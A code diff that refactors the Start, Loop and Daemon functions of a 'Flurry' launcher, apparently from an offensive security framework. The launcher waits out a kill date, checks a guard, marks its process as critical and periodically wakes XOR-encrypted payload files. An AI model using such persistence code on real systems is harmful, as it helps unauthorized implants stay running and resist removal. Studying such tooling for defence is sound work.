@@ -1,4 +1,4 @@
-// Copyright (C) 2020 - 2023 iDigitalFlame
+// Copyright (C) 2020 - 2024 iDigitalFlame
 //
 // This program is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
@@ -51,24 +51,47 @@ import (
 //	            random order and is expected to be encrypted using the supplied
 //	            key value.
 func Start(critical bool, killdate int64, l man.Linker, guard string, key []byte, files []string) {
-	defer func() {
-		if err := recover(); err != nil {
-			device.GoExit()
-		}
-	}()
-	if killdate != 0 && time.Now().After(time.Unix(killdate, 0)) {
-		device.GoExit()
-	}
-	limits.Ignore()
-	var z bool
-	guard = checkGuard(l, guard)
-	if time.Sleep(time.Millisecond * time.Duration(100+util.FastRandN(200))); critical {
+	Loop(0, critical, killdate, l, guard, key, files)
+}
+func loop(wait time.Duration, critical bool, k time.Time, l man.Linker, g string, key []byte, files []string) {
+	var (
+		x, y = context.WithCancel(context.Background())
+		w    = make(chan os.Signal, 1)
+		t    = time.NewTicker(wait)
+		s    uint32
+		z    bool
+	)
+	if limits.MemorySweep(x); critical {
 		z, _ = device.SetCritical(true)
 	}
-	if man.WakeMultiFile(l, guard, crypto.XOR(key), files); critical && !z {
+	limits.Notify(w, syscall.SIGINT, syscall.SIGTERM)
+loop:
+	for time.Sleep(time.Millisecond * time.Duration(100+util.FastRandN(500))); ; {
+		select {
+		case <-w:
+			break loop
+		case n := <-t.C:
+			if !k.IsZero() && n.After(k) {
+				break loop
+			}
+			if atomic.LoadUint32(&s) == 1 {
+				// NOTE(dij): We don't swap here to prevent overriting the
+				//            one in the goroutine.
+				break
+			}
+			atomic.StoreUint32(&s, 1) // Block further calls to Wake until we're done.
+			go func() {
+				man.WakeMultiFile(l, g, crypto.XOR(key), files)
+				atomic.StoreUint32(&s, 0)
+			}()
+		}
+	}
+	t.Stop()
+	limits.StopNotify(w)
+	close(w)
+	if y(); critical && !z {
 		device.SetCritical(false)
 	}
-	device.GoExit()
 }
 
 // Loop attempts to create a Flurry instance with the supplied arguments. This
@@ -96,63 +119,28 @@ func Start(critical bool, killdate int64, l man.Linker, guard string, key []byte
 //	            random order and is expected to be encrypted using the supplied
 //	            key value.
 func Loop(wait time.Duration, critical bool, killdate int64, l man.Linker, guard string, key []byte, files []string) {
-	if wait <= 0 {
-		Start(critical, killdate, l, guard, key, files)
-		return
-	}
 	defer func() {
 		if err := recover(); err != nil {
 			device.GoExit()
-			return
 		}
 	}()
-	var k time.Time
+	var (
+		g = checkGuard(l, guard)
+		k time.Time
+	)
 	if killdate != 0 {
-		if k = time.Unix(killdate, 0); time.Now().After(k) {
-			device.GoExit()
-		}
+		k = time.Unix(killdate, 0)
 	}
 	limits.Ignore()
-	var (
-		x, y = context.WithCancel(context.Background())
-		w    = make(chan os.Signal, 1)
-		t    = time.NewTicker(wait)
-		s    uint32
-		z    bool
-	)
-	if limits.Notify(w, syscall.SIGINT, syscall.SIGTERM); critical {
-		z, _ = device.SetCritical(true)
-	}
-	limits.MemorySweep(x)
-	guard = checkGuard(l, guard)
-loop:
-	for time.Sleep(time.Millisecond * time.Duration(100+util.FastRandN(200))); ; {
-		select {
-		case <-w:
-			break loop
-		case n := <-t.C:
-			if killdate != 0 && !k.IsZero() && n.After(k) {
-				break loop
-			}
-			if atomic.LoadUint32(&s) == 1 {
-				// NOTE(dij): We don't swap here to prevent overriting the
-				//            one in the goroutine.
-				break
-			}
-			atomic.StoreUint32(&s, 1) // Block further calls to Wake until we're done.
-			go func() {
-				man.WakeMultiFile(l, guard, crypto.XOR(key), files)
-				atomic.StoreUint32(&s, 0)
-			}()
+	if len(g) > 0 && (k.IsZero() || time.Now().Before(k)) {
+		if wait <= 0 {
+			time.Sleep(time.Millisecond * time.Duration(100+util.FastRandN(500)))
+			man.WakeMultiFile(l, g, crypto.XOR(key), files)
+		} else {
+			loop(wait, critical, k, l, g, key, files)
 		}
 	}
-	if t.Stop(); critical && !z {
-		device.SetCritical(false)
-	}
-	y()
 	limits.Reset()
-	limits.StopNotify(w)
-	close(w)
 	device.GoExit()
 }
 
@@ -181,26 +169,32 @@ loop:
 //	files    - List of files to check against. Each file will be checked in a
 //	            random order
 func Daemon(t time.Duration, name string, critical bool, killdate int64, l man.Linker, guard string, key []byte, files []string) {
-	var z bool
-	if critical {
-		z, _ = device.SetCritical(true)
-	}
 	var k time.Time
 	if killdate != 0 {
-		if k = time.Unix(killdate, 0); time.Now().After(k) {
-			device.GoExit()
-		}
+		k = time.Unix(killdate, 0)
 	}
-	limits.Ignore()
-	device.DaemonTicker(name, t, func(x context.Context) error {
-		if limits.MemorySweep(x); killdate != 0 && !k.IsZero() && time.Now().After(k) {
-			return device.ErrQuit
+	if len(guard) > 0 && (k.IsZero() || time.Now().Before(k)) {
+		var (
+			x, f = context.WithCancel(context.Background())
+			g    = checkGuard(l, guard)
+			z    bool
+		)
+		if critical {
+			z, _ = device.SetCritical(true)
 		}
-		man.WakeMultiFile(l, guard, crypto.XOR(key), files)
-		return nil
-	})
-	if critical && !z {
-		device.SetCritical(false)
+		limits.Ignore()
+		limits.MemorySweep(x)
+		device.DaemonTicker(name, t, func(_ context.Context) error {
+			if !k.IsZero() && time.Now().After(k) {
+				return device.ErrQuit
+			}
+			man.WakeMultiFile(l, g, crypto.XOR(key), files)
+			return nil
+		})
+		if critical && !z {
+			device.SetCritical(false)
+		}
+		f()
 	}
 	device.GoExit()
 }
